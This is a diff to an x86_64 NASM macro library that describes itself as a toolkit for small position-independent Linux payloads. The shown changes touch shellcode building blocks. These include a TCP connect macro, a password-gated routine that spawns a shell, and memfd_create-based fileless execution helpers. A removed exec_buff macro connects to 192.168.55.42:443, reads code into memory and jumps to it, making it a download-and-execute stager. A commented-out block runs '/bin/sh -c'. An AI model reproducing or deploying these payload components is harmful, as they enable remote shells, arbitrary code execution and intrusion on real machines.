@@ -19,7 +19,7 @@
 ;       |                         |      .      |     *  .  .   *
 ;       |---- [Bare]              |             |      .    
 ;                                 |             |
-;                     [Metal] ----|             |       # Framework for building small, position-independent payloads 
+;                     [Metal] ----|             |       # Toolkit for building small, position-independent payloads 
 ;                                               |
 ;                                               |       * Platform:         GNU/Linux
 ;                                               |       * Architecture:     x86_64
@@ -426,7 +426,7 @@
     cld
     repnz   scasb
     neg     rcx
-    sub     rcx,2                   ;minus2 for trailing zero and the place behind
+    sub     rcx,2                   
     push rcx
     pop rax
 %endmacro
@@ -1184,39 +1184,44 @@
 ;
 ; Establishes a TCP connection with desired host
 ; Socket file descriptor is passed in RAX by default
-%macro sock_connect 2-3 rax 
-    xchg rdi, rax                
-    push %1
-    pop rax
-    ip2hex
-    push rax
-    pop r10
-    push rdi
-    pop rbx
-    mov dword [rsp-4], r10 
-    mov word  [rsp-6], %2    
-    mov byte  [rsp-8], 0x02      
-    sub rsp, 8                   
-    push SYS_CONNECT
-    pop rax                      
-    mov rsi, rsp                 
-    push 16
-    pop rdx                      
-    syscall                      
-%endmacro
+;%macro sock_connect 2-3 rax 
+;    xchg rdi, rax                
+;    push %1
+;    pop rax
+;    ip2hex
+;    push rax
+;    pop r10
+;    push rdi
+;    pop rbx
+;    mov dword [rsp-4], r10 
+;    mov word  [rsp-6], %2    
+;    mov byte  [rsp-8], 0x02      
+;    sub rsp, 8                   
+;    push SYS_CONNECT
+;    pop rax                      
+;    mov rsi, rsp                 
+;    push 16
+;    pop rdx                      
+;    syscall                      
+;%endmacro
 
 ; Args -> IP (string), port (int)
 ;
 ; Alternative version of the above macro
 ; Credits for @netspooky
-%macro sock_connect2 2 
+%macro sock_connect 2 
     push rax
     pop rdi 
+    push %1
+    pop rax
+    ip2hex
+    push rax
+    pop r12
     xor r9, r9
     push SYS_CONNECT
     pop rax             
     push r9             
-    push %1     
+    push r12     
     push word %2    
     push word 2         
     mov rsi, rsp        
@@ -1253,7 +1258,7 @@
     push SYS_READ
     pop rax
     reserve_stack_bytes_rel 8, rsi
-    add rdx, 8          ; read 8 bytes
+    add rdx, 8          
     syscall
     cmp rax, -1
     je %%continue 
@@ -1261,7 +1266,7 @@
     rel_load rax, %%pwd
     push rsi
     pop rdi
-    scasq               ; compares RAX and [RDI]
+    scasq               
     jne %%continue            
     spawn_sh
     %%continue:
@@ -1322,14 +1327,7 @@
     db %1, 0x00
     %%dr:
     mov r9, rsp
-    push %2
-    pop r8
-    cmp r8, FALSE
-    je %%use_standard_table_size
-    push MFD_HUGETLB
-    pop rsi
-    %%use_standard_table_size:
-    xor rsi, rsi ; ?
+    xor rsi, rsi 
     push SYS_MEMFD_CREATE
     pop rax
     push r9
@@ -1349,7 +1347,7 @@
     memfd_create
     push rax
     pop r12
-    fd2fd
+    fd2fd_sendfile
     push rax
     pop r9
 %endmacro
@@ -1362,82 +1360,6 @@
 
 %endmacro
 
-%macro exec_buff 0
-    push SYS_BRK
-    pop rax
-    xor rdi, rdi
-    syscall
-    push SYS_BRK
-    pop rax
-    push 4096
-    pop rdi
-    syscall
-    ;push rax
-    ;pop rcx
-        
-    ; :TODO: MMAP HERE
-
-
-    syscall                         ;// mmap(addr, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANONYMOUS, -1, 0)
-    mov r9, rax                     ;// save heap address in r9
-
-    ;// ===================>
-    ;// SOCKET CONNECTION =>
-    ;// ===================>
-    xor rax, rax
-    mov al, 41                      ;// int socket()
-    xor rdi, rdi
-    inc rdi
-    inc rdi                         ;// AF_INET
-    xor rsi, rsi
-    inc rsi                         ;// SOCK_STREAM
-    xor rdx, rdx
-    mov dl, 6                       ;// IPPROTO_TCP
-    syscall                         ;// socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
-    push rax
-    pop rdi                         ;// save the socket's fd in rdi for connect() to use
-
-    xor rax, rax
-    push rax
-    mov dword [rsp-4], 0x2a37a8c0   ;// 192.168.55.42
-    mov word [rsp-6], 0xbb01        ;// port 443 in lil' endian
-    sub rsp, 6
-    push word 0x2
-
-    xor rax, rax
-    mov al, 42                      ;// int connect()
-    mov rsi, rsp
-    xor rdx, rdx
-    mov dl, 16
-    syscall                         ;// connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("192.168.55.42")}, 16)
-
-    ;// ====================================>
-    ;// READ CODE FROM SOCKET FD INTO HEAP =>
-    ;// ====================================>
-    mov rsi, r9                     ;// heap addr still saved in r9
-    xor rdx, rdx
-    mov dl, 41                      ;// CHANGE THIS NUMBER TO SUIT THE SIZE OF YOUR PAYLOAD (41-byte payload used in testing)
-    xor rax, rax
-    syscall                         ;// read(3, heap_addr, SIZE)
-
-    ;// =================>
-    ;// CLOSE SOCKET FD =>
-    ;// =================>
-    xor rax, rax
-    mov al, 3
-    syscall                         ;// close(3)
-
-    jmp r9                          ;// jmp to the heap address in r9 and execute the downloaded payload
-
-    ;// =========>
-    ;// EXIT(0) => this bit is unnecessary if your payload already calls exit()
-    ;// =========>
-    xor rax, rax
-    mov al, 60
-    xor rdi, rdi
-    syscall
-
-%endmacro
 
 ; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x10 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 
 
@@ -1578,38 +1500,6 @@
     syscall
 %endmacro
 
-%macro file_mmap 0 
-	; open the file
-	mov rdi, rsi
-	mov rax, 2
-	mov rsi, 0x402 ; RW mode
-	syscall
-
-	cmp rax, 0
-	jng end
-
-	mov rbx, rax
-
-	; stat the file to know its length
-	mov rsi, rsp
-    reserve_stack_bytes_rel STAT_size, rsi
-	;sub rsi, STAT_size
-	mov rax, 4
-	syscall
-
-	; mmap the file
-	mov r8, rbx   							; the fd
-	mov rsi, [rsi+STAT.st_size] 			; the len
-
-	mov rdi, 0								; we write this shit on the stack
-	mov rdx, 6								; protect RW = PROT_READ (0x04) | PROT_WRITE (0x02)
-	xor r9, r9								; r9 = 0 <=> offset_start = 0
-	mov r10, 0x1   							; flag = MAP_SHARED
-	xor rax, rax
-	mov rax, 9 								; mmap syscall number
-	syscall
-%endmacro
-
 ; Args -> filename (string), [mode] (variable) 
 ;
 ; Opens a file by path specified in %1, in a desired mode
@@ -1630,35 +1520,36 @@
 
 ; Args -> [source_fd] (register), [dest_fd] (register), [size] (int)
 ;
-; Reads 'size' bytes from source file descriptor and writes them to destination
+; Reads file in 'size' bytes chunks from source file descriptor and writes them to destination
 ; Destination file descriptor is returned in 'dest_fd' register and RAX
 %macro fd2fd 0-3 r11,r12,2048
     push %3
     pop rdx
-    ;mov rdx, 0x400               ; size_t count = 1024 bytes 
+    ;mov rdx, 0x400               
     %%read_write_loop:
-    ;mov rdi, rbx                 ; Move sockFD to RDI
+    ;mov rdi, rbx                 
     push %1
     pop rdi
-    xor rax, rax                 ; 0 is read sycall
+    xor rax, rax                 
     reserve_stack_bytes_rel %3,rsi
-    ;lea rsi, [rsp-%3]          ; buffer to hold output - arg1 *buf
-    syscall                      ; Read syscall
-    ;mov rdi, r9                  ; Copy the file descriptor from our local file
+    ;lea rsi, [rsp-%3]          
+    syscall                      
+    ;mov rdi, r9                  
     push %2
     pop rdi
-    ;mov rdx, rax                 ; RDX = # of bytes read, 0 means end of file
+    ;mov rdx, rax                 
     push rax
     pop rdx
-    xor rax, rax                 ; RAX = 0
+    xor rax, rax                 
     push SYS_WRITE
     pop rax
-    syscall                      ; Write syscall
-    cmp rdx, %3               ; Check if there are still bytes left to read
+    syscall                      
+    cmp rdx, %3               
     je %%read_write_loop 
     push r12
     pop rax
 %endmacro
+
 
 ; Args -> register with fd
 ;
@@ -1784,7 +1675,7 @@
 ; This macro requires `get_current_size_var` macro to be called at the end of your .text section
 ; The size-retrieving macro should be called without any arguments, in order to populate 'fsize' variable used below
 ; This macro creates a default ELF header, and should be invoked at the beginning of .text section
-; Credits -> @RickSanchez 0x00sec
+; Credits -> @RickSanchez from 0x00sec
 %macro elf_header 0
 ehdr:                                          
         db  0x7F, "ELF", 2, 1, 1, 0            
@@ -1893,37 +1784,6 @@ phdrsize    equ $ - phdr
 %macro remove_self_instant 0
 
 %endmacro
-
-; Args -> [num_tables] (int)
-;
-; Initialize a given number of huge pages (2MB each)
-; Argument num_tables is optional, and defaults to 15
-;%macro init_hgtbl 0-1 0x0f
-;    push    SYS_EXECVE
-;    pop     rax
-;    cdq
-;    %%shell_name: "//bin/sh"
-;    rel_load rcx, %%shell_name
-;    mov     rcx, '//bin/sh'
-;    push    rdx
-;    push    rcx
-;    push    rsp
-;    pop     rdi
-;    push    rdx
-;    push    word '-c'
-;    push    rsp
-;    pop     rbx
-;    push    rdx
-;    .cmd_load:
-;    call    .x_cmd
-;    db "ht_enabled=$(grep HugePages_Total /proc/meminfo | awk '{print $NF}')", 0x3b, 0x00
-;    .x_cmd:
-;    push    rbx
-;    push    rdi
-;    push    rsp
-;    pop     rsi
-;    syscall
-;%endmacro
 
 ; Args -> dir (string)
 ;
@@ -2300,17 +2160,6 @@ phdrsize    equ $ - phdr
 
 
 ; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = < * > = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 
-
-
-
-;%macro armed_payload 0-1 5555
-;    push %1
-;    pop rax
-;    cmp rax, 1
-;    je %%mutex_file
-;    %%mutex_sock:
-;    %%mutex_file:
-;%endmacro
 
 ; sigprocmask(2) -> block
 ; signalfd(2), poll(2)
